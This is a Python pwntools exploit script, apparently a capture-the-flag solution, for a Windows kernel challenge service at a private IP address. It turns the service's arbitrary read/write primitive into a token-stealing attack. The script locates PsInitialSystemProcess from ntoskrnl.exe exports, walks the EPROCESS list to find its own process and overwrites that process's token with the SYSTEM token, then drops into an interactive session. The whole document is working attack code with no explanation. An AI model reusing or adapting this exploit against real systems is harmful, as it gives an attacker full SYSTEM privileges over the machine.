from pwn import *
import pefile

def whoami():
    io.sendline(b'5')
    result = io.recvuntil(b'\r\n', drop=True)
    io.recvuntil(b'choice: ')
    return result

def get_entry(idx):
    io.sendline(b'1')
    io.recvuntil(b'idx: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'Entry: ')
    result = int(io.recvuntil(b'\r\n', drop=True).decode(), 16)
    io.recvuntil(b'choice: ')
    return result

def set_entry(idx, value):
    io.sendline(b'2')
    io.recvuntil(b'idx: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'value: ')
    io.sendline(str(value).encode())
    io.recvuntil(b'choice: ')

def idx_to_addr(addr):
    diff = addr - base
    return diff // 8

def read_at_address(addr):
    return get_entry(idx_to_addr(addr))

def write_to_address(addr, value):
    set_entry(idx_to_addr(addr), value)

pe = pefile.PE('ntoskrnl.exe')
psInitialSystemProcess_sym = None

for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
    if exp.name:
        if exp.name.decode() == 'PsInitialSystemProcess':
            psInitialSystemProcess_sym = exp.address
            break
print(psInitialSystemProcess_sym)

io = remote('192.168.205.174', 31337)

io.recvuntil(b'ntoskrnl.exe: ')
ntoskrnl = int(io.recvuntil(b'\r\n', drop=True).decode(), 16)
psInitialSystemProcess_off = psInitialSystemProcess_sym + ntoskrnl

io.recvuntil(b'PID: ')
pid = int(io.recvuntil(b'\r\n', drop=True).decode())

info(f'ntoskrnl: {hex(ntoskrnl)}')
info(f'PsInitialSystemProcess offset: {hex(psInitialSystemProcess_off)}')
info(f'PID: {pid}')

io.recvuntil(b'choice: ')

info(f'Currently we are: {whoami()}')
base = get_entry(64)

info(f'Read start point: {hex(base)}')
psInitialSystemProcess = read_at_address(psInitialSystemProcess_off)
info(f'PsInitialSystemProcess: {hex(psInitialSystemProcess)}')

# ==========================================
# Finding EPROCESS of our process
# ==========================================

activeProcessLinks_step = 0x448
pid_step = 0x440

links = psInitialSystemProcess + activeProcessLinks_step
head = links

while True:
    # read links->next
    links = read_at_address(links + 8)
    info(f'    links {hex(links)}')

    if links == head:
        info('LINKS == HEAD')
        break

    eprocess = links - activeProcessLinks_step
    info(f'    EPROCESS: {hex(eprocess)}')

    pid_ = read_at_address(eprocess + pid_step)
    if pid_ != pid:
        continue

    break

info(f'Our current EPROCESS: {hex(eprocess)}')

token_offset = 0x4b8
system_token = read_at_address(psInitialSystemProcess + token_offset)
info(f'System token: {hex(system_token)}')

write_to_address(eprocess + token_offset, system_token)

info(f'Now we are: {whoami()}')

io.interactive()
